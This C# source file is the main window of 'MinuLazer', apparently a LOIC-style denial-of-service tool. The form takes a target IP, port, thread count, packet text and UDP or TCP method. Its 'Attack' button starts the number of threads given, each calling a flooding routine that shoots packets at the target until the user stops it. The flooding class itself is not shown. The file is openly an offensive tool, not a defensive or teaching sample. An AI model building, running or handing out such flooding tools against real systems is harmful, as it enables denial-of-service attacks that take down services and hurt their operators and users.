using System;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MinuLazer.Functions;

namespace MinuLazer.Forms
{
    public partial class MainForm : Form
    {
        Point position;
        bool move;

        MinuFlood lazer = new MinuFlood();
        Method methods = new Method();

        public MainForm()
        {
            InitializeComponent();

            /* Form move */
            MouseDown += (o, e) => { if (e.Button == MouseButtons.Left) { move = true; position = e.Location; } };
            MouseMove += (o, e) => { if (move) Location = new Point(Location.X + (e.X - position.X), Location.Y + (e.Y - position.Y)); };
            MouseUp += (o, e) => { if (e.Button == MouseButtons.Left) { move = false; position = e.Location; } };
        }

        private void attackButton_Click(object sender, EventArgs e)
        {
            string msg_packet_text = packetBox.Text;
            if(packetBox.Text.Length > 50)
            {
                msg_packet_text = packetBox.Text.Substring(0, 30) + " ...";
            }
            
            DialogResult msg = MessageBox.Show
            (
                " Target: " + ipBox.Text + ":" + portBox.Text
                + Environment.NewLine + " Thread: " + threadBox.Text
                + Environment.NewLine + " Packet: " + msg_packet_text
                + Environment.NewLine + " Method: " + methodBox.Text
                + Environment.NewLine
                + Environment.NewLine + " Press [OK] Button to Attack"
                + Environment.NewLine + " Press [Cancel] Button to Calcel"
                , " Attack Start", MessageBoxButtons.OKCancel
            );

            if (msg == DialogResult.OK)
            {
                closeButton.Enabled = false;

                logBox.Text += Environment.NewLine + "[*] Attack Start";
                stateLogBox.Text = "Shooting to " + ipBox.Text + ":" + portBox.Text;

                attackButton.Enabled = false;
                stopButton.Enabled = true;

                for (int i = 0; i < (Int32.Parse(threadBox.Text) + 1); i++)
                {
                    if (methodBox.Text == "UDP" || methodBox.Text == "udp")
                    {
                        Thread attack = new Thread(() => lazer.Shoot(ipBox.Text, Int32.Parse(portBox.Text),
                            Encoding.UTF8.GetBytes(packetBox.Text), methods.METHOD_UDP)
                        );
                        attack.Start();
                    }
                    else if (methodBox.Text == "TCP" || methodBox.Text == "tcp")
                    {
                        Thread attack = new Thread(() => lazer.Shoot(ipBox.Text, Int32.Parse(portBox.Text),
                            Encoding.UTF8.GetBytes(packetBox.Text), methods.METHOD_TCP)
                        );
                        attack.Start();
                    }
                    threadLogBox.Text = "Thread: " + i.ToString();
                }
            }
        }

        private void stopButton_Click(object sender, EventArgs e)
        {
            closeButton.Enabled = true;

            logBox.Text += Environment.NewLine + "[*] Attack Stop";
            stateLogBox.Text = "Ready";
            threadLogBox.Text = "Thread: 0";

            attackButton.Enabled = true;
            stopButton.Enabled = false;

            lazer.Stop();
        }

        private void githubPage_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/seungyup26/minulazer");
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/seungyup26/minulazer");
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
    }
}